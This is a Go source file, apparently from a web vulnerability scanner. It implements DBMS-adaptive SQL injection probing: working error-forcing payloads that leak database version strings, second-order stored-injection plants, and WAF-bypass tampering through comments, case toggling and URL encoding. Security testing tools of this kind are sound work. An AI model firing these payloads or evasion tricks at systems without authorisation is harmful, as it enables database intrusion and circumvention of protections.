package scanner

import (
	"context"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync/atomic"
)

// ─────────────────────────────────────────────────────────────────────────────
// Item 2: DBMS-adaptive SQLi.
//
// Three additions layered on top of the deterministic error/boolean/content
// ladder, none of them time-based:
//
//   1. DBMS FINGERPRINTING — identify the engine from its error dialect so the
//      report says WHICH database and so we can send engine-specific proofs.
//   2. ERROR-FORCED DATA EXTRACTION — payloads that make the engine RAISE an
//      error whose text contains a value WE asked it to compute (version, plus a
//      unique marker). For MySQL the marker is sent as HEX and only appears as
//      ASCII if the DB actually decoded+evaluated it, making the proof
//      reflection-proof (a page that merely echoes our input can't produce it).
//   3. WAF-BYPASS TAMPERING — when a payload is blocked, retry with comment/
//      case/encoding transforms until one gets through.
// ─────────────────────────────────────────────────────────────────────────────

// sqliMarker is the unique token we make the database echo back inside an error.
const sqliMarker = "RCNQ1SQLI"

// sqliMarkerHex is the marker as a MySQL hex literal (0x…), so the ASCII marker
// only appears in the response if MySQL decoded and evaluated it — reflection of
// the raw payload can never produce it.
var sqliMarkerHex = "0x" + hex.EncodeToString([]byte(sqliMarker))

// dbmsSignatures maps a canonical DBMS name to error strings unique to it.
var dbmsSignatures = []struct {
	name string
	re   *regexp.Regexp
}{
	{"mysql", regexp.MustCompile(`(?i)SQL syntax.*MySQL|MySQLSyntaxError|com\.mysql\.jdbc|valid MySQL result|XPATH syntax error|corresponds to your (MySQL|MariaDB) server`)},
	{"postgresql", regexp.MustCompile(`(?i)PostgreSQL|pg_query\(\)|PSQLException|Npgsql|(?:pq:.*)?syntax error at or near|invalid input syntax for (?:type )?integer`)},
	{"mssql", regexp.MustCompile(`(?i)Microsoft SQL Server|Unclosed quotation mark|ODBC SQL Server Driver|System\.Data\.SqlClient|Incorrect syntax near|Conversion failed when converting`)},
	{"oracle", regexp.MustCompile(`(?i)ORA-[0-9]{5}|Oracle error|quoted string not properly terminated`)},
	{"sqlite", regexp.MustCompile(`(?i)SQLite3?::|sqlite3\.OperationalError|SQLITE_ERROR`)},
	{"db2", regexp.MustCompile(`(?i)DB2 SQL error|SQLCODE`)},
	{"firebird", regexp.MustCompile(`(?i)Dynamic SQL Error|Firebird`)},
	{"sybase", regexp.MustCompile(`(?i)Sybase message|SybSQLException`)},
	{"h2", regexp.MustCompile(`(?i)org\.h2\.jdbc\.JdbcSQL(?:Syntax)?ErrorException|\[4200[01]-\d+\]`)},
	{"hsqldb", regexp.MustCompile(`(?i)org\.hsqldb\.HsqlException`)},
	{"sap-hana", regexp.MustCompile(`(?i)\[HDBODBC\]|SAP DBTech JDBC`)},
	{"informix", regexp.MustCompile(`(?i)Informix|com\.informix\.jdbc`)},
	{"vertica", regexp.MustCompile(`(?i)\[Vertica\](?:\[VJDBC\])?`)},
	{"clickhouse", regexp.MustCompile(`(?i)DB::Exception:|ClickHouse exception`)},
	{"snowflake", regexp.MustCompile(`(?i)SQL compilation error:`)},
	{"trino", regexp.MustCompile(`(?i)(?:io\.trino|io\.prestosql)\..*Exception`)},
	{"cockroachdb", regexp.MustCompile(`(?i)CockroachDB`)},
}

// fingerprintDBMS returns the canonical engine name inferred from a response
// body, or "" when nothing engine-specific is present.
func fingerprintDBMS(body string) string {
	for _, s := range dbmsSignatures {
		if s.re.MatchString(body) {
			return s.name
		}
	}
	return ""
}

// errorForcePayload is one engine-specific proof payload.
//   - asciiMarker=false → the marker is carried as hex, so an ASCII-marker match
//     in the response is proof the DB evaluated it (reflection-proof).
//   - asciiMarker=true  → the marker is sent literally; a match counts ONLY when
//     it appears together with a NEW DB error the baseline lacked (so a plain
//     reflection of our input can't be mistaken for extraction).
type errorForcePayload struct {
	value       string
	dbms        string
	asciiMarker bool
}

// sqliErrorForcePayloads returns the error-forcing proof payloads, across quote/
// no-quote/paren boundaries, per engine.
func sqliErrorForcePayloads() []errorForcePayload {
	out := []errorForcePayload{}
	// MySQL — extractvalue/updatexml leak the concat() value into an XPATH error.
	// Marker is HEX → reflection-proof.
	myExpr := fmt.Sprintf("extractvalue(1,concat(0x7e,%s,0x7e,version()))", sqliMarkerHex)
	myUpd := fmt.Sprintf("updatexml(1,concat(0x7e,%s,0x7e,version()),1)", sqliMarkerHex)
	myGTID := fmt.Sprintf("gtid_subset(concat(%s,0x7e,version()),1)", sqliMarkerHex)
	for _, boundary := range []string{"1 AND %s", "1' AND %s-- -", `1" AND %s-- -`, "1) AND %s-- -", "1') AND %s-- -"} {
		out = append(out, errorForcePayload{value: fmt.Sprintf(boundary, myExpr), dbms: "mysql", asciiMarker: false})
		out = append(out, errorForcePayload{value: fmt.Sprintf(boundary, myUpd), dbms: "mysql", asciiMarker: false})
		out = append(out, errorForcePayload{value: fmt.Sprintf(boundary, myGTID), dbms: "mysql", asciiMarker: false})
	}
	// PostgreSQL — cast a string to int; the string (our marker) shows up in
	// "invalid input syntax for integer". Marker is ASCII → needs the error too.
	for _, boundary := range []string{"1 AND 1=cast('%s' as int)", "1' AND 1=cast('%s' as int)-- -", "1) AND 1=cast('%s' as int)-- -"} {
		out = append(out, errorForcePayload{value: fmt.Sprintf(boundary, sqliMarker), dbms: "postgresql", asciiMarker: true})
	}
	// MSSQL — convert('marker' to int) → "Conversion failed … 'marker' … int".
	for _, boundary := range []string{"1 AND 1=convert(int,'%s')", "1' AND 1=convert(int,'%s')-- -", "1) AND 1=convert(int,'%s')-- -"} {
		out = append(out, errorForcePayload{value: fmt.Sprintf(boundary, sqliMarker), dbms: "mssql", asciiMarker: true})
	}
	// Oracle / DB2 / Java embedded databases: invalid numeric casts raise a
	// DBMS-specific conversion error containing the supplied value on common
	// drivers. Literal marker therefore requires BOTH marker + a fresh DB error.
	for _, p := range []errorForcePayload{
		{value: fmt.Sprintf("1 AND 1=TO_NUMBER('%s')", sqliMarker), dbms: "oracle", asciiMarker: true},
		{value: fmt.Sprintf("1' AND 1=TO_NUMBER('%s')-- -", sqliMarker), dbms: "oracle", asciiMarker: true},
		{value: fmt.Sprintf("1 AND 1=CAST('%s' AS INTEGER)", sqliMarker), dbms: "db2", asciiMarker: true},
		{value: fmt.Sprintf("1 AND 1=CAST('%s' AS INT)", sqliMarker), dbms: "h2", asciiMarker: true},
		{value: fmt.Sprintf("1' AND 1=CAST('%s' AS INT)-- -", sqliMarker), dbms: "hsqldb", asciiMarker: true},
	} {
		out = append(out, p)
	}
	return out
}

// errorForceConfirmed decides whether a response proves error-based extraction.
// reflectionProof marks a hex-marker (MySQL) payload where an ASCII-marker match
// is itself proof; otherwise the marker must appear with a fresh DB error.
func errorForceConfirmed(reflectionProof bool, baseline, resp string) (bool, string) {
	if !strings.Contains(resp, sqliMarker) || strings.Contains(baseline, sqliMarker) {
		return false, ""
	}
	dbms := fingerprintDBMS(resp)
	if reflectionProof {
		// The raw payload carried only hex; an ASCII marker means the DB decoded it.
		return true, dbms
	}
	// ASCII-marker engines: require a DB error that the baseline did not have.
	if dbms != "" && fingerprintDBMS(baseline) == "" {
		return true, dbms
	}
	return false, ""
}

// extractLeakedVersion pulls the DB version banner that follows our marker in a
// MySQL XPATH error (…~RCNQ1SQLI~<version>…), best-effort for the evidence line.
func extractLeakedVersion(resp string) string {
	i := strings.Index(resp, sqliMarker)
	if i < 0 {
		return ""
	}
	rest := resp[i+len(sqliMarker):]
	rest = strings.TrimLeft(rest, "~ ")
	// stop at the first character that clearly ends the leaked token
	if j := strings.IndexAny(rest, "'\"<>\n\r\t"); j >= 0 {
		rest = rest[:j]
	}
	if len(rest) > 60 {
		rest = rest[:60]
	}
	return strings.TrimSpace(rest)
}

// ─── WAF-bypass tampering ────────────────────────────────────────────────────

var sqliKeywordRe = regexp.MustCompile(`(?i)\b(AND|OR|SELECT|UNION|FROM|WHERE|CONVERT|CAST|EXTRACTVALUE|UPDATEXML|VERSION)\b`)

// tamperVariants returns filter-evasion rewrites of a payload, most-likely-to-
// work first. Distinct only; the original is NOT included (the caller sends it
// first and only falls back to these when blocked).
func tamperVariants(payload string) []string {
	seen := map[string]bool{payload: true}
	var out []string
	add := func(v string) {
		if v != "" && !seen[v] {
			seen[v] = true
			out = append(out, v)
		}
	}
	// 1) inline comments instead of spaces (classic space-filter bypass)
	add(strings.ReplaceAll(payload, " ", "/**/"))
	// 2) MySQL versioned comment around spaces
	add(strings.ReplaceAll(payload, " ", "/*!50000*/"))
	// 3) random-case keywords (blocklist that matches exact-case tokens)
	add(sqliKeywordRe.ReplaceAllStringFunc(payload, toggleCase))
	// 4) comment-space + mixed case combined
	add(sqliKeywordRe.ReplaceAllStringFunc(strings.ReplaceAll(payload, " ", "/**/"), toggleCase))
	// 5) URL-encode the whole payload
	add(url.QueryEscape(payload))
	// 6) double URL-encode
	add(url.QueryEscape(url.QueryEscape(payload)))
	return out
}

// toggleCase alternates the case of a token so a case-sensitive keyword blocklist
// (e.g. one that only strips "UNION"/"union") no longer matches.
func toggleCase(s string) string {
	b := []byte(s)
	for i := range b {
		if i%2 == 0 {
			if b[i] >= 'a' && b[i] <= 'z' {
				b[i] -= 32
			}
		} else if b[i] >= 'A' && b[i] <= 'Z' {
			b[i] += 32
		}
	}
	return string(b)
}

// sqliSendMaybeTamper sends value; if the response looks like a WAF/challenge
// block, it retries with tamper variants and returns the first non-blocked body
// plus the tamper description used ("" when the plain payload got through).
func sqliSendMaybeTamper(ctx context.Context, ip insertionPoint, value string, auth map[string]string) (body string, tamper string) {
	body, _ = sendInjected(ctx, sqliHTTPClient, ip, value, auth)
	if body != "" && !bodyLooksLikeWAFBlock(body) {
		return body, ""
	}
	for i, v := range tamperVariants(value) {
		if ctx.Err() != nil {
			return body, ""
		}
		b, _ := sendInjected(ctx, sqliHTTPClient, ip, v, auth)
		if b != "" && !bodyLooksLikeWAFBlock(b) {
			return b, fmt.Sprintf("WAF-bypass tamper #%d applied (%q)", i+1, truncateTamper(v))
		}
	}
	return body, ""
}

func truncateTamper(v string) string {
	if len(v) > 48 {
		return v[:48] + "…"
	}
	return v
}

// ─── Second-order (stored) SQLi ──────────────────────────────────────────────

// sqliGet fetches a URL with the SQLi client and optional auth headers, returning
// the (capped) body. Used to re-read pages after planting a stored payload.
func sqliGet(ctx context.Context, rawURL string, auth map[string]string) string {
	req, err := http.NewRequestWithContext(ctx, "GET", rawURL, nil)
	if err != nil {
		return ""
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")
	for k, v := range auth {
		req.Header.Set(k, v)
	}
	resp, err := sqliHTTPClient.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	return string(b)
}

// secondOrderProbe plants an error-forcing payload through a WRITE insertion point
// (a POST/body/JSON param), then re-reads readURLs. If the STORED payload later
// surfaces a DB error leaking our reflection-proof hex marker on a *different*
// request, that is second-order (stored) SQLi — an injection whose sink is a
// query that runs elsewhere, invisible to in-request testing.
func (s *SQLiScanner) secondOrderProbe(ctx context.Context, writeIP insertionPoint, readURLs []string, auth map[string]string) (string, string) {
	if len(readURLs) == 0 {
		return "", ""
	}
	// Reflection-proof MySQL payload (hex marker → an ASCII match on read-back can
	// only come from the DB decoding+evaluating it, never from echoing our input).
	stored := fmt.Sprintf("z' AND extractvalue(1,concat(0x7e,%s,0x7e,version()))-- -", sqliMarkerHex)
	_, _ = sendInjected(ctx, sqliHTTPClient, writeIP, stored, auth)
	for _, u := range readURLs {
		if ctx.Err() != nil {
			return "", ""
		}
		body := sqliGet(ctx, u, auth)
		if body == "" {
			continue
		}
		if ok, dbms := errorForceConfirmed(true, "", body); ok {
			ev := fmt.Sprintf("second-order (stored) SQLi PROVEN: a payload written via the %q parameter (%s) surfaced a %s error leaking our reflection-proof marker %q when the page %s was later rendered — the injection's sink is a query that runs on a DIFFERENT request",
				writeIP.Param, writeIP.Method, dbms, sqliMarker, u)
			if ver := extractLeakedVersion(body); ver != "" {
				ev += fmt.Sprintf(" (leaked version: %s)", ver)
			}
			return "error_based", ev
		}
	}
	return "", ""
}

// secondOrderReadURLs returns distinct GET URLs on the target to re-read after a
// stored payload is planted (where a delayed SQL sink would render it).
func (s *SQLiScanner) secondOrderReadURLs(ctx context.Context, targetID string, limit int) []string {
	seen := map[string]bool{}
	var out []string
	add := func(u string) {
		u = strings.TrimSpace(u)
		if u != "" && !seen[u] && len(out) < limit {
			seen[u] = true
			out = append(out, u)
		}
	}
	if rows, err := s.db.QueryContext(ctx, `SELECT DISTINCT url FROM http_services WHERE target_id=? LIMIT ?`, targetID, limit); err == nil {
		for rows.Next() {
			var u string
			if rows.Scan(&u) == nil {
				if !urlHostInScope(ctx, u) {
					continue
				}
				add(u)
			}
		}
		rows.Close()
	}
	if rows, err := s.db.QueryContext(ctx, `SELECT DISTINCT url FROM parameters WHERE target_id=? LIMIT ?`, targetID, limit); err == nil {
		for rows.Next() {
			var u string
			if rows.Scan(&u) == nil {
				if !urlHostInScope(ctx, u) {
					continue
				}
				add(u)
			}
		}
		rows.Close()
	}
	return out
}

// secondOrderChecks runs the second-order (stored) SQLi pass: for each write-ish
// (POST/body) insertion point, plant a stored error-force payload and look for a
// delayed marker leak across the target's read pages. Bounded so a big target
// can't explode the request count.
func (s *SQLiScanner) secondOrderChecks(ctx context.Context, targetID string, candidates []insertionPoint, auth map[string]string, found *atomic.Int64, logFn LogFunc) {
	var writes []insertionPoint
	for _, ip := range candidates {
		if strings.EqualFold(ip.Method, "POST") {
			writes = append(writes, ip)
		}
	}
	if len(writes) == 0 {
		return
	}
	readURLs := s.secondOrderReadURLs(ctx, targetID, 30)
	if len(readURLs) == 0 {
		return
	}
	if len(writes) > 20 {
		writes = writes[:20]
	}
	// Plant a UNIQUE reflection-proof hex token in every write first, then read
	// each rendering page once (two rounds only for eventual consistency). The old
	// nested loop re-read up to 30 pages after EACH of 20 fields: 620 requests.
	// Batching preserves exact write attribution while reducing that worst case to
	// 20 + 2*30 = 80 requests.
	type plantedWrite struct {
		ip    insertionPoint
		token string
	}
	plants := make([]plantedWrite, 0, len(writes))
	for _, w := range writes {
		if ctx.Err() != nil {
			return
		}
		token := strings.ToUpper(newXSSToken("RCNS2"))
		tokenHex := hex.EncodeToString([]byte(token))
		payload := fmt.Sprintf("z' AND extractvalue(1,concat(0x7e,0x%s,0x7e,version()))-- -", tokenHex)
		_, _ = sendInjected(ctx, sqliHTTPClient, w, payload, auth)
		plants = append(plants, plantedWrite{ip: w, token: token})
	}

	matched := make(map[string]bool, len(plants))
	for round := 0; round < 2 && len(matched) < len(plants); round++ {
		for _, u := range readURLs {
			if ctx.Err() != nil {
				return
			}
			body := sqliGet(ctx, u, auth)
			if body == "" || fingerprintDBMS(body) != "mysql" {
				continue
			}
			for _, p := range plants {
				key := insertionIdentity(p.ip)
				if matched[key] || !strings.Contains(body, p.token) {
					continue
				}
				// The request carried the token only as hexadecimal. Its ASCII form
				// in a MySQL/XPath error therefore proves DB evaluation rather than
				// reflection, exactly like the historical one-at-a-time probe.
				ev := fmt.Sprintf("second-order (stored) SQLi PROVEN: a payload written via parameter %q (%s) later surfaced a MySQL error leaking the reflection-proof token %q when %s rendered; the token was sent only as a hex literal", p.ip.Param, p.ip.Method, p.token, u)
				if ver := extractLeakedVersionForMarker(body, p.token); ver != "" {
					ev += fmt.Sprintf(" (leaked version: %s)", ver)
				}
				s.store(targetID, "sqli", "high", p.ip, "error_based", ev)
				found.Add(1)
				matched[key] = true
				logFn("warn", "sqli", fmt.Sprintf("Second-order SQLi CONFIRMED: %s param=%s", p.ip.URL, p.ip.Param))
				s.notify(targetID, p.ip.URL, p.ip.Param)
			}
		}
	}
}

func extractLeakedVersionForMarker(resp, marker string) string {
	i := strings.Index(resp, marker)
	if i < 0 {
		return ""
	}
	rest := strings.TrimLeft(resp[i+len(marker):], "~ ")
	if j := strings.IndexAny(rest, "'\"<>\n\r\t"); j >= 0 {
		rest = rest[:j]
	}
	if len(rest) > 60 {
		rest = rest[:60]
	}
	return strings.TrimSpace(rest)
}

// errorForceProbe runs the DBMS-adaptive error-forced extraction over an insertion
// point. Returns ("error_based", evidence) on a proven extraction, else ("","").
func (s *SQLiScanner) errorForceProbe(ctx context.Context, ip insertionPoint, auth map[string]string, baseline string) (string, string) {
	for _, p := range sqliErrorForcePayloads() {
		if ctx.Err() != nil {
			return "", ""
		}
		value := sqliBaseValue(ip) + strings.TrimPrefix(p.value, "1")
		resp, tamper := sqliSendMaybeTamper(ctx, ip, value, auth)
		if resp == "" {
			continue
		}
		ok, dbms := errorForceConfirmed(!p.asciiMarker, baseline, resp)
		if !ok {
			continue
		}
		if dbms == "" {
			dbms = p.dbms
		}
		ev := fmt.Sprintf("error-based SQLi PROVEN via forced data extraction: the database evaluated our injected expression and leaked the unique marker %q inside a %s error", sqliMarker, dbms)
		if !p.asciiMarker {
			if ver := extractLeakedVersion(resp); ver != "" {
				ev += fmt.Sprintf(" (leaked version: %s)", ver)
			}
		}
		if !p.asciiMarker {
			ev += " — reflection-proof (marker was sent only as a hex literal, so an ASCII match means the engine decoded and executed it)"
		}
		if tamper != "" {
			ev += " · " + tamper
		}
		return "error_based", ev
	}
	return "", ""
}
